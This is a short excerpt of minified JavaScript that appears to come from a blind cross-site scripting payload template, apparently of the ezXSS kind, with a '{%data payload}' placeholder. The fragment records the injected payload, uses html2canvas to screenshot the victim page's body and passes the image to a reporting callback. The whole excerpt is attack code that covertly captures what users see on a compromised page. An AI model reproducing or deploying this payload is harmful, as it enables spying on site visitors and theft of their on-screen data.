...
try{ez_rD.payload="{%data payload}"}catch(e){ez_rD.payload=""}try{"undefined"!=typeof html2canvas?html2canvas(document.body,{'max-width':1920,'max-height':1080}).then(function(t){ez_rD.screenshot=ez_n(t.toDataURL()),ez_c()}).catch(function(t){ez_rD.screenshot="",ez_c()}):(ez_rD.screenshot="",ez_c())}catch(t){ez_rD.screenshot="",ez_c()}
